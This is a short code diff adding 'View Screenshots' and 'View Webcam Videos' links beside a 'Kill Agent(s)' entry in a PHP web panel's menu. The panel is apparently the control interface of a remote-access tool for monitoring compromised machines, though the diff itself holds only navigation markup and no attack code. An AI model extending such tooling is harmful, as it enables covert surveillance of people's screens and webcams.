@@ -80,6 +80,12 @@
                             <li>
 								<a href="kill-agent.php">Kill Agent(s)</a>
 							</li>
+							<li>
+								<a href="show-agent-screenshots.php">View Screenshots</a>
+							</li>
+							<li>
+								<a href="show-agent-webcam.php">View Webcam Videos</a>
+							</li>
                         </ul>
 					</li>
                     <li class="dropdown">
